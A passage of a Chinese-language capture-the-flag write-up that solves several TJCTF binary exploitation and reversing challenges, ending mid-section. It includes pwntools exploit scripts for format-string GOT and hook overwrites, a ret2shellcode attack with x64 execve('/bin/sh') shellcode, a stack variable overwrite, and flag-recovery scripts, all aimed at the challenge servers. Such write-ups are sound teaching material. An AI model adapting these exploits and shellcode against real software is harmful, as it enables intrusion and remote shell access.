    strcmp_got = 0x00602070
    secure_service = 0x00400da0
    # stage 1: make it loop
    stage1 = '%{}x'.format(secure_service)
    stage1 += '%28$n  '
    stage1 += p64(memset_got)
    send_payload(stage1)
    # stage 2: leak libc
    # for i in range(1, 50):
    #   send_payload('%{}$llx'.format(i), True)
    output = int(send_payload('%1$llx', True), 16)
    system_c = output - 3789731
    lib_c_base = system_c - 0x0004f440
    pwn_adrr = lib_c_base + 0x10a38c
    free_hook = lib_c_base + 0x001ed8e8 + 0x200000
    print hex(lib_c_base)
    print hex(pwn_adrr)
    print hex(free_hook)
    pause()
    # stage 3: pwn
    goal = hex(pwn_adrr+0x10000000000000000)[3:]
    for i in range(len(goal), 4, -4):
      stage3 = '%{}x'.format(int(goal[i-4:i], 16))
      l = len(stage3)
      stage3 += '%28$n'.ljust(16-l)
      stage3 += p64(free_hook+(16-i)/2)
      send_payload(stage3, True)
    send_payload('%65537c')
    sh.interactive()
这里后期也是调用了execve(“/bin/sh”),不过前面利用printf内部的特点来hijack-hook-function：
    https://github.com/Naetw/CTF-pwn-tips#hijack-hook-function
## 0x02 Secure Secrets
简单的格式化字符串&&GOT表修改  
查看程序保护：  
 **发现No PIE**  
看到get_message函数：  
关键点：
    printf("n");
    printf(a1);
    printf("n");
且a1可控，显然这里有格式化字符串漏洞  
同时看到函数get_secret：
      v1 = fopen("flag.txt", "r");
      if ( v1 )
      {
        __isoc99_fscanf(v1, "%s", &v2);
        printf("Here is your secret: %sn", &v2);
      }
      else
      {
        puts("Secret could not be accessed.");
      }
在get_message函数中：
      printf("n");
      printf(a1);
      printf("n");
      puts("Tada! Hope you liked our service!");
且在main中：
    get_message(&v4, &s);
    exit(0);
所以我们修改got中puts、printf或者exit地址(但修改printf老是失效，不知道什么原因)来跳转到get_secret  
 **利用格式化漏洞修改GOT表中特定函数地址为get_secret函数地址：**  
Exploit：
    from pwn import *
    e=ELF("./secret")
    p=remote('problem1.tjctf.org', 8008)
    secret_addr=e.symbols["get_secret"]
    puts_got_addr=e.got["puts"]
    payload=p32(puts_got_addr)
    payload+=p32(puts_got_addr+2)
    payload+='%34571c'
    payload+='%35$n'
    payload+='%33009c'
    payload+='%36$n'
    payload+='n'
    p.recvuntil("> ")
    p.sendline("a")
    p.recvuntil("> ")
    p.sendline(payload)
    p.recvuntil("> ")
    p.sendline("a")
    p.interactive()
## 0x03 Online Banking
简单的ret2shellcode，利用bss段执行shellcode  
首先查看程序保护：  
没有任何保护  
查看程序，发现：
    fgets(name, 33, stdin);
读入的name可以容下shellcode(有时候长度不够，可以考虑name紧接着的地方可不可控，使几段数据可以连接组成shellcode)  
name位于：
    .bss:00000000006010A0 name            db 21h dup(?)           ; DATA XREF: main+78↑o
查看.bss段权限：  
可以执行  
x64下shellcode：
    "x6ax3b"                                    # pushq    $0x3b
    "x58"                                        # pop    %rax
    "x99"                                        # cltd
    "x48xbbx2fx2fx62x69x6ex2fx73x68"               # mov    $0x68732f6e69622f2f, %rbx
    "x48xc1xebx08"                            # shr    $0x8, %rbx
    "x53"                                        # push   %rbx
    "x48x89xe7"                                # mov    %rsp, %rdi
    "x52"                                        # push    %rdx
    "x57"                                        # push   %rdi
    "x48x89xe6"                                # mov    %rsp, %rsi
    "xb0x3b"                                    # mov    $0x3b, %al
    "x0fx05"                                    # syscall
exploit：
    from pwn import *
    payload="a"*9+p64(0x00000000deadbeef)+p64(0x0000000006010a0)
    payload2="x6ax3bx58x99x48xbbx2fx2fx62x69x6ex2fx73x68x48xc1xebx08x53x48x89xe7x52x57x48x89xe6xb0x3bx0fx05"
    p=remote("problem1.tjctf.org",8005)
    print p.recvuntil("Name: ")
    p.sendline(payload2)
    print p.recvuntil("PIN: ")
    p.sendline("aaaa")
    print p.recvuntil("quit")
    p.sendline("d")
    print p.recvuntil("PIN: ")
    p.sendline(payload)
    p.interactive()
## 0x04 Bricked Binary
hint：
    Earlier, I input my flag to this image and received 22c15d5f23238a8fff8d299f8e5a1c62 as the output. Unfortunately, later on I broke the program and also managed to lose my flag. Can you find it for me?
提示：I broke the program  
看到程序这里：
    mov     [ebp+src], offset unk_8048684
    mov     eax, [ebx+4]
    add     eax, 4
    mov     eax, [eax]
    sub     esp, 8
    push    [ebp+src]       ; src
    push    eax             ; dest
    call    _strcpy
    add     esp, 10h
    mov     eax, [ebx+4]
    add     eax, 4
    mov     eax, [eax]
    sub     esp, 0Ch
    push    eax             ; s
    call    hash
而unk_8048684处为”db 0”  
显然这个”call _strcpy”有问题  
看到hash函数对命令行参数进行了处理：
    int __cdecl hash(char *s)
    {
      int result; // eax
      int i; // [esp+4h] [ebp-14h]
      signed int v3; // [esp+8h] [ebp-10h]
      v3 = strlen(s);
      for ( i = 0; ; ++i )
      {
        result = i;
        if ( i >= v3 )
          break;
        s[v3 - 1 - i] = LOBYTE(u[i]) ^ LOBYTE(v[s[v3 - 1 - i]]);
      }
      return result;
    }
利用程序定义好的u和v两个数组进行一种简单的异或加密  
密文输出： **22c15d5f23238a8fff8d299f8e5a1c62**  
首先可以直接提取u和v数组后逆算法：
    ans="22c15d5f23238a8fff8d299f8e5a1c62"
    flag=""
    k="81000000CD0000000A00000073000000B30000003B00000032000000B60000006E0000007C0000003100000057000000D1000000C5000000150000003A00000092000000B4000000E200000051000000AE000000420000005500000041000000E100000070000000300000001A0000000200000084000000A2000000E7000000B90000004D0000003C000000A30000000B000000B20000002B000000AB000000460000007E000000240000009C000000850000006F000000E4000000C40000005F000000CE0000004F0000000100000082000000FD0000006C000000AC000000DF000000640000000C000000A1000000E30000009E0000005D000000BB000000FE000000D30000002900000096000000C7000000F3000000FC00000065000000AA0000008A0000005A000000F5000000B700000038000000A50000008D000000D80000008E0000003900000007000000DE000000D50000001100000080000000E50000008900000035000000FF000000DD000000A60000001F000000230000000D000000C000000093000000C8000000670000001700000068000000180000008B00000062000000CC0000009D000000DA0000005600000066000000C60000007F000000E600000086000000E000000022000000C20000000F0000001B000000F60000002D0000006300000033000000910000007100000059000000EB000000A9000000D200000083000000BF0000003D0000006A00000008000000F9000000A70000004000000000000000E800000052000000BE000000FA0000004E0000002600000076000000CF000000540000007D0000001900000006000000F8000000D00000007400000028000000050000003F000000A00000001E000000C10000004500000049000000D4000000AF000000030000009B0000002F000000EE000000270000009A000000A400000097000000480000004A000000D90000003700000047000000AD00000044000000CA000000EF000000D7000000B8000000DB000000F00000009F0000005800000053000000EA0000002A0000007A00000036000000870000008C000000B50000007200000088000000B100000009000000F1000000160000003E0000006900000014000000EC00000025000000BC000000ED000000BA000000BD0000002C000000C9000000DC00000013000000F4000000750000001D0000004B000000C300000034000000100000006B00000077000000980000005E0000005C000000990000008F0000001200000094000000CB0000002E0000004C000000E900000020000000F70000004300000060000000FB0000006D0000001C000000780000000E000000B0000000D600000050000000790000007B0000006100000095000000A8000000040000005B000000F20000009000000021000000"
    key
    for i in range(len(ans)/2):
        key1=int(ans[32-(i+1)*2:32-(i+1)*2+2],16)
        key2=int(key[i*8:i*8+2],16)
        key3=key1^key2
        key4=hex(key3)[2:]
        if len(key4)==1:
            key4="0"+key4
        key4=key4.upper()
        key6=k.find(key4)/8
        if key6<30:
            key6=k.rfind(key4)/8
        flag+=chr(key6)
    print flag[::-1]
或者：  
可以看到加密过程中最后的位置不受前面影响，也就是可以根据密文从后向前逐位爆破出flag  
首先patch掉程序，直接将”call
_strcpy”nop掉即可(不然strcpy会使我们在命令行输入的任何字符串变为x00)，调用patch好的程序爆破：
    from pwn import *
    ans="22c15d5f23238a8fff8d299f8e5a1c62"
    flag=""
    for i in range(16):
     for j in range(30,127):
      p=process(["./re_4",chr(j)+flag])
      s=p.recv()[:2]
      if s==ans[32-(i+1)*2:32-(i+1)*2+2]:
        flag=chr(j)+flag
        p.close()
        break
      p.close()
    print flag
## 0x05 Math Whiz
最基本的变量覆盖  
看到关键(获取flag)处：
    .text:565C9A08                 cmp     [ebp+var_C], 0
    .text:565C9A0C                 jz      short loc_565C9A3F
    .text:565C9A0E                 sub     esp, 8
    .text:565C9A11                 lea     eax, [ebp+var_30]
    .text:565C9A14                 push    eax
    .text:565C9A15                 lea     eax, (aSuccessfullyRe - 565CAFA8h)[ebx] ; "Successfully registered '%s' as an admi"...
    .text:565C9A1B                 push    eax             ; format
    .text:565C9A1C                 call    _printf
    .text:565C9A21                 add     esp, 10h
    .text:565C9A24                 sub     esp, 8
    .text:565C9A27                 lea     eax, (aRedacted - 565CAFA8h)[ebx] ; "-----REDACTED-----"
    .text:565C9A2D                 push    eax
    .text:565C9A2E                 lea     eax, (aHereIsYourFlag - 565CAFA8h)[ebx] ; "Here is your flag: %sn"
    .text:565C9A34                 push    eax             ; format
    .text:565C9A35                 call    _printf
    .text:565C9A3A                 add     esp, 10h
    .text:565C9A3D                 jmp     short loc_565C9A55
    .text:565C9A3F ; ---------------------------------------------------------------------------    .text:565C9A3F
    .text:565C9A3F loc_565C9A3F:                           ; CODE XREF: main+1A0↑j
    .text:565C9A3F                 sub     esp, 8
    .text:565C9A42                 lea     eax, [ebp+var_30]
    .text:565C9A45                 push    eax
    .text:565C9A46                 lea     eax, (aSuccessfullyRe_0 - 565CAFA8h)[ebx] ; "Successfully registered '%s' as an user"...
    .text:565C9A4C                 push    eax             ; format
    .text:565C9A4D                 call    _printf
    .text:565C9A52                 add     esp, 10h
    .text:565C9A55
    .text:565C9A55 loc_565C9A55:                           ; CODE XREF: main+1D1↑j
    .text:565C9A55                 mov     eax, 0
    .text:565C9A5A                 lea     esp, [ebp-8]
    .text:565C9A5D                 pop     ecx
    .text:565C9A5E                 pop     ebx
    .text:565C9A5F                 pop     ebp
    .text:565C9A60                 lea     esp, [ecx-4]
    .text:565C9A63                 retn
两种register方式  
我们需要ebp+var_C不为0即可  
这里我们的输入流调用了input  
查看input：
    fgets(s, (signed int)(a2 * 16.0), stdin);
而：
    printf("Recovery Pin: ");
    input(v30, 4.0);
可以向v30读入64字节：  
其中：
    char v30[4]; // [esp+60h] [ebp-44h]
    ebp+var_C：
    int v43; // [esp+98h] [ebp-Ch]
可以利用v30覆盖掉ebp+var_C从而获取flag：
    from pwn import *
    p=remote("problem1.tjctf.org",8001)
    p.recvuntil("Full Name: ")
    p.sendline("Kirin")
    p.recvuntil("Username: ")
    p.sendline("Kirin")
    p.recvuntil("Password: ")
    p.sendline("kirin")
    p.recvuntil("Recovery Pin: ")
    p.sendline("A"*64)
    p.recvuntil("Email: ")
    p.sendline("Kirin")
    p.recvuntil("Address: ")
    p.sendline("Kirin")
    p.recvuntil("Biography: ")
    p.sendline("Kirin")
    p.interactive()
## 0x06 Tilted Troop
同样是很简单的变量覆盖  
看到在fight函数中可以输出flag：
    int __fastcall fight(__int64 a1, int a2)
    {
      unsigned int v3; // [rsp+18h] [rbp-8h]
      int i; // [rsp+1Ch] [rbp-4h]
      v3 = 0;
      for ( i = 0; i < a2; ++i )
        v3 += *(char *)(i + a1);
      if ( v3 != 400 )
        return printf("Your team had %d strength, but you needed exactly %d!n", v3, 400LL);
      puts("Wow! Your team is strong! Here, take this flag:");
      return puts("[REDACTED]");
    }
我们需要让a1指针指向的长为a2的char型数组之和为400  
main函数：
    int __cdecl main(int argc, const char **argv, const char **envp)
    {